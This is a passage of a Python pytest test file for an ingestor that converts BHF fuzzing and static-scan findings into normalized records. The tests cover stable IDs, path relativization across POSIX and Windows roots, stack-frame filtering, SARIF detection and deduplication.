        assert "F-0005-c0dca483" in {f.raw_ref for f in run_b}

        def key(fs: list) -> list[tuple[str, str, str, str]]:
            return sorted((f.id, f.title, f.description, f.content_hash) for f in fs)

        assert key(run_a) == key(run_b)
        for f in run_b:
            assert "F-0005" not in f.id and "F-CAP" not in f.id
            assert "0x" not in f.title
            assert "0x" not in f.description

    def test_csv_only_id_uses_signature(self, tmp_path: Path) -> None:
        work = _copy_run(tmp_path, csv_only=True)
        f = _by_raw_ref(BhfIngestor(source_root=Path("/work/src")).ingest(work))[F0000]
        assert f.id == "bhf-c0dca483634e97eccb8dc392359e31df7161004c60335111725d0d7033c4428b"

    def test_capability_id_is_cluster_not_ordinal(self) -> None:
        f = _by_raw_ref(BhfIngestor().ingest(WORK))["F-CAP-0000"]
        assert f.id == "bhf-abe8be87705e0caab1fc12beced15e8d40c391a66d88826ee9e07e1a9ad294d0"

    def test_description_strips_segv_register_tail(self, tmp_path: Path) -> None:
        doc = _f0000_doc()
        doc["exception"]["message"] = (
            "ERROR: AddressSanitizer: SEGV on unknown address 0x000000000010 "
            "(pc 0x5886692362b6 bp 0x7fff2922beb0 sp 0x7fff2922b670 T0)"
        )
        p = tmp_path / "finding.json"
        p.write_text(json.dumps(doc))
        [f] = BhfIngestor(source_root=Path("/work/src")).ingest(p)
        assert f.description.endswith("Sanitizer report (asan): ERROR: AddressSanitizer: SEGV")


def _copy_run(tmp_path: Path, csv_only: bool) -> Path:
    work = tmp_path / "a"
    work.mkdir()
    shutil.copy(CSV_PATH, work / "findings.csv")
    if not csv_only:
        shutil.copytree(WORK / "auto", work / "auto")
        shutil.copytree(WORK / "findings", work / "findings")
    return work


@pytest.mark.unit
class TestBhfSinkCandidates:
    """#5: each sink candidate is mapped; the first that maps wins."""

    def test_unmappable_finding_json_path_falls_back_to_csv_sink(self, tmp_path: Path) -> None:
        # Air-gapped hand-off: findings.csv + findings/ only (no auto/run.json);
        # source under /usr/src/app; CSV sink_file already root-relative.
        work = tmp_path / "work"
        work.mkdir()
        for d in (WORK / "findings").iterdir():
            dst = work / "findings" / d.name
            shutil.copytree(d, dst)
            text = (d / "finding.json").read_text().replace("/work/src/", "/usr/src/app/")
            (dst / "finding.json").write_text(text)
        fields, rows = _csv_rows()
        for row in rows:
            row["sink_file"] = row["sink_file"].replace("/work/src/", "")
        _write_csv(work / "findings.csv", fields, rows)
        by = _by_raw_ref(BhfIngestor().ingest(work))
        f = by[F0000]
        assert f.affected_hosts == ["parse.c"]
        assert [(r.file_path, r.start_line, r.symbol) for r in f.source_code_refs] == [
            ("parse.c", 9, "parse_record")
        ]
        # The root is inferred from the matching absolute/relative sink pair, so
        # the crash stack survives and /usr/src/app never leaks.
        assert f.fuzz is not None
        assert f.fuzz.stack == [StackFrame(file="parse.c", function="parse_record", line=9)]
        assert "/usr/src/app" not in f.remediation
        cap = by["F-CAP-0000"]
        assert [(r.file_path, r.start_line) for r in cap.source_code_refs] == [("cmd.c", 4)]

    def test_static_row_prefers_csv_sink_over_finding_json_basename(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(STATIC_WORK, work)
        doc_path = work / "findings" / "F-STATIC-0000" / "finding.json"
        doc = json.loads(doc_path.read_text())
        doc["actionability"]["sink"] = {"file": "parse.c", "line": 6, "function": "copy_name"}
        doc_path.write_text(json.dumps(doc))
        [f] = BhfIngestor().ingest(work)
        assert [(r.file_path, r.start_line, r.symbol) for r in f.source_code_refs] == [
            ("lib/parse.c", 6, "copy_name")
        ]
        assert f.affected_hosts == ["lib/parse.c"]


@pytest.mark.unit
class TestBhfStaticRows:
    """#6: F-STATIC-* rows (real ``bhf auto --static --static-dynamic`` output) are SAST."""

    STATIC_ID = "bhf-static-bhf-401-lib-parse-c-6"

    def test_static_row_is_sast_without_fuzz_evidence(self) -> None:
        [f] = BhfIngestor().ingest(STATIC_WORK)
        assert f.category == FindingCategory.SAST
        assert f.fuzz is None
        assert f.id == self.STATIC_ID
        assert f.raw_ref == "F-STATIC-0000"
        assert f.severity == Severity.HIGH
        assert f.cwe_id == 120
        assert f.title == "Unbounded string copy (strcpy/strcat/gets) with no length limit"
        assert [(r.file_path, r.start_line, r.symbol) for r in f.source_code_refs] == [
            ("lib/parse.c", 6, "copy_name")
        ]
        assert "bhf:confirmation:static" in f.tags
        assert "bhf:classification:static_scan" in f.tags
        assert f.extra_fields["bhf_rule_id"] == "BHF-401"
        assert f.extra_fields["bhf_confirmation"] == "static"
        assert "replay" not in json.dumps(f.model_dump(mode="json"))

    def test_static_finding_dir_without_csv(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(STATIC_WORK / "findings", work / "findings")
        shutil.copytree(STATIC_WORK / "auto", work / "auto")
        [f] = BhfIngestor().ingest(work)
        assert f.category == FindingCategory.SAST
        assert f.id == self.STATIC_ID
        assert f.source_code_refs[0].file_path == "lib/parse.c"
        assert f.source_code_refs[0].start_line == 6
        assert f.fuzz is None

    def test_static_finding_json_is_detected(self) -> None:
        p = STATIC_WORK / "findings" / "F-STATIC-0000" / "finding.json"
        assert BhfIngestor().can_handle(p) is True


def _windows_work(tmp_path: Path) -> Path:
    work = tmp_path / "win"
    work.mkdir()
    (work / "auto").mkdir()
    (work / "auto" / "run.json").write_text(json.dumps({"source_root": "C:\\proj"}))
    doc = _f0000_doc()
    text = json.dumps(doc).replace("/work/src/", "C:\\\\proj\\\\")
    doc = json.loads(text)
    doc["exception"]["stack"].insert(
        1,
        {
            "file": "C:\\Program Files\\LLVM\\lib\\clang\\asan_malloc_win.cpp",
            "function": "malloc",
            "line": 99,
        },
    )
    doc["exception"]["stack"].append(
        {"file": "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\exe_common.inl", "function": "invoke_main"}
    )
    d = work / "findings" / F0000
    d.mkdir(parents=True)
    (d / "finding.json").write_text(json.dumps(doc))
    return work


@pytest.mark.unit
class TestBhfWindowsPaths:
    """#7: backslash / drive-letter roots are normalized like POSIX roots."""

    def test_windows_run_is_relativized(self, tmp_path: Path) -> None:
        [f] = BhfIngestor().ingest(_windows_work(tmp_path))
        assert [(r.file_path, r.start_line) for r in f.source_code_refs] == [("parse.c", 9)]
        assert f.affected_hosts == ["parse.c"]
        assert f.fuzz is not None
        assert f.fuzz.stack == [StackFrame(file="parse.c", function="parse_record", line=9)]
        assert "C:\\proj" not in f.remediation
        assert "C:\\proj" not in f.description
        assert "`parse.c:9`" in f.remediation

    def test_mapper_windows_root(self) -> None:
        from tarmo_vuln_core.ingestors.parsers.bhf import _normalize_root, _PathMapper

        m = _PathMapper(_normalize_root("C:\\proj"))
        assert m.project_path("C:\\proj\\a.c") == "a.c"
        assert m.project_path("c:/proj/sub/b.c") == "sub/b.c"
        assert m.project_path("C:\\other\\a.c") is None
        assert m.scrub_text("see C:\\proj\\a.c and C:/proj/b.c") == "see a.c and b.c"

    def test_mapper_no_root_drops_windows_toolchain_paths(self) -> None:
        from tarmo_vuln_core.ingestors.parsers.bhf import _PathMapper

        m = _PathMapper(None)
        assert m.project_path("C:\\Program Files\\LLVM\\asan_malloc_win.cpp") is None
        assert m.project_path("C:\\Windows\\System32\\ntdll.c") is None


@pytest.mark.unit
class TestBhfForeignFrames:
    """#8 glibc-relative frames, #9 root '/', #10 scrub boundaries."""

    def test_glibc_relative_frames_are_dropped(self, tmp_path: Path) -> None:
        doc = _f0000_doc()
        doc["exception"]["stack"] = [
            {
                "file": "nptl/pthread_kill.c",
                "function": "__pthread_kill_implementation",
                "line": 44,
            },
            {"file": "signal/../sysdeps/posix/raise.c", "function": "raise", "line": 26},
            {"file": "stdlib/abort.c", "function": "abort", "line": 79},
            {"file": "assert/assert.c", "function": "__assert_fail_base", "line": 94},
            {"file": "/work/src/parse.c", "function": "parse_record", "line": 9},
            {"file": "nptl/pthread_create.c", "function": "start_thread", "line": 447},
        ]
        p = tmp_path / "finding.json"
        p.write_text(json.dumps(doc))
        [f] = BhfIngestor(source_root=Path("/work/src")).ingest(p)
        assert f.fuzz is not None
        assert f.fuzz.stack == [StackFrame(file="parse.c", function="parse_record", line=9)]

    def test_root_slash_still_drops_runtime_and_system_frames(self) -> None:
        f = _by_raw_ref(BhfIngestor(source_root=Path("/")).ingest(CSV_PATH))[F0000]
        assert f.fuzz is not None
        assert f.fuzz.stack == [
            StackFrame(file="work/src/parse.c", function="parse_record", line=9)
        ]
        assert f.source_code_refs[0].file_path == "work/src/parse.c"

    def test_mapper_root_slash(self) -> None:
        from pathlib import PurePosixPath

        from tarmo_vuln_core.ingestors.parsers.bhf import _PathMapper

        m = _PathMapper(PurePosixPath("/"))
        assert m.project_path("/opt/bhf/c_runtime/bhf_driver.c") is None
        assert m.project_path("/usr/include/stdio.h") is None
        assert m.project_path("/srv/fw/app.c") == "srv/fw/app.c"

    def test_scrub_text_respects_path_boundaries(self) -> None:
        from pathlib import PurePosixPath

        from tarmo_vuln_core.ingestors.parsers.bhf import _PathMapper

        m = _PathMapper(PurePosixPath("/src"))
        assert m.scrub_text("see /usr/src/linux/include/x.h") == "see /usr/src/linux/include/x.h"
        assert m.scrub_text("at `/src/a.c:3`") == "at `a.c:3`"
        assert m.scrub_text("https://host/target/x and /opt/target/lib.c") == (
            "https://host/target/x and /opt/target/lib.c"
        )
        m2 = _PathMapper(PurePosixPath("/work/src"))
        assert m2.scrub_text("mounted at /target/lib.c") == "mounted at /target/lib.c"
        assert _PathMapper(None).scrub_text("mounted at /target/lib.c") == "mounted at lib.c"


def _bhf_report_sarif(path: Path) -> Path:
    doc = {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [
            {
                "tool": {"driver": {"name": "BHF", "version": "0.2.32", "rules": []}},
                "results": [
                    {
                        "ruleId": "BHF-201",
                        "level": "error",
                        "message": {"text": "unhandled in parse_record: heap-buffer-overflow"},
                        "partialFingerprints": {"bhfExceptionSignature": sig},
                        "properties": {
                            "bhfFindingId": fid,
                            "bhfExceptionSignature": sig,
                            "confirmation": "fuzz",
                        },
                    }
                    for fid, sig in (("F-0000-aaaa0000", "a" * 64), ("F-0001-bbbb0000", "b" * 64))
                ],
                "properties": {"bhfRunId": "r1", "bhfReportSchemaVersion": 3},
            }
        ],
    }
    path.write_text(json.dumps(doc))
    return path


@pytest.mark.unit
class TestBhfReportSarifNotClaimed:
    """#11: ``bhf report --sarif`` fuzz findings are not static-scan output."""

    def test_static_ingestor_does_not_claim_report_sarif(self, tmp_path: Path) -> None:
        p = _bhf_report_sarif(tmp_path / "report.sarif")
        assert BhfStaticIngestor().can_handle(p) is False
        assert isinstance(auto_detect(p), SarifIngestor)
        assert not isinstance(auto_detect(p), BhfStaticIngestor)

    def test_static_ingestor_rejects_report_sarif(self, tmp_path: Path) -> None:
        p = _bhf_report_sarif(tmp_path / "report.sarif")
        with pytest.raises(IngestorError, match="not a BHF static report"):
            BhfStaticIngestor().ingest(p)


@pytest.mark.unit
class TestBhfMemberIds:
    """#12: member_ids excludes the representative on every ingest path."""

    def test_csv_member_ids_exclude_representative(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        fields, rows = _csv_rows()
        rows[0]["count"] = "2"
        rows[0]["member_finding_ids"] = f"{F0000};F-0007-deadbeef"
        _write_csv(work / "findings.csv", fields, rows)
        f = _by_raw_ref(BhfIngestor().ingest(work))[F0000]
        assert f.fuzz is not None
        assert f.fuzz.member_ids == ["F-0007-deadbeef"]
        assert f.extra_fields["bhf_count"] == 2


def _walk_ingest(root: Path) -> list:
    """Mimic scribe ``ingest-dir --recursive`` / MCP rglob: auto_detect every file."""
    out: list = []
    for p in sorted(root.rglob("*"), reverse=True):
        if not p.is_file():
            continue
        try:
            ing = auto_detect(p)
        except IngestorError:
            continue
        if isinstance(ing, BhfIngestor):
            out.extend(ing.ingest(p))
    return out


@pytest.mark.unit
class TestBhfRecursiveWalk:
    """#13: walking a work dir file-by-file yields the CSV view for every file."""

    def test_finding_json_joins_its_csv_row(self) -> None:
        via_json = BhfIngestor().ingest(WORK / "findings" / "F-0003-77f37013" / "finding.json")
        via_csv = _by_raw_ref(BhfIngestor().ingest(CSV_PATH))["F-0003-77f37013"]
        assert len(via_json) == 1
        assert via_json[0].model_dump() == via_csv.model_dump()
        assert via_json[0].title == "OS command injection via controlled argv/cmdline in run_cmd"
        assert [(r.file_path, r.start_line) for r in via_json[0].source_code_refs] == [("cmd.c", 4)]

    def test_non_representative_member_joins_representative_row(self, tmp_path: Path) -> None:
        work = tmp_path / "work"
        shutil.copytree(WORK, work)
        member = _f0000_doc()
        member["id"] = "F-0007-c0dca483"
        member["actionability"]["impact"] = "low"
        d = work / "findings" / "F-0007-c0dca483"
        d.mkdir()
        (d / "finding.json").write_text(json.dumps(member))
        fields, rows = _csv_rows()
        rows[0]["count"] = "2"
        rows[0]["member_finding_ids"] = f"{F0000};F-0007-c0dca483"
        _write_csv(work / "findings.csv", fields, rows)
        [f] = BhfIngestor().ingest(d / "finding.json")
        assert f.raw_ref == F0000
        assert f.severity == Severity.CRITICAL

    def test_recursive_walk_one_view_per_root_cause(self) -> None:
        found = _walk_ingest(WORK)
        by_id: dict[str, list] = {}
        for f in found:
            by_id.setdefault(f.id, []).append(f)
        assert len(by_id) == 6
        # Every duplicate is content-identical, so any dedup/merge order is safe.
        for dupes in by_id.values():
            assert len({f.content_hash for f in dupes}) == 1
            assert len({json.dumps(f.model_dump(mode="json"), sort_keys=True) for f in dupes}) == 1
        cmd = next(fs[0] for fs in by_id.values() if fs[0].raw_ref == "F-0003-77f37013")
        assert cmd.title == "OS command injection via controlled argv/cmdline in run_cmd"
        assert [(r.file_path, r.start_line, r.symbol) for r in cmd.source_code_refs] == [
            ("cmd.c", 4, "run_cmd")
        ]
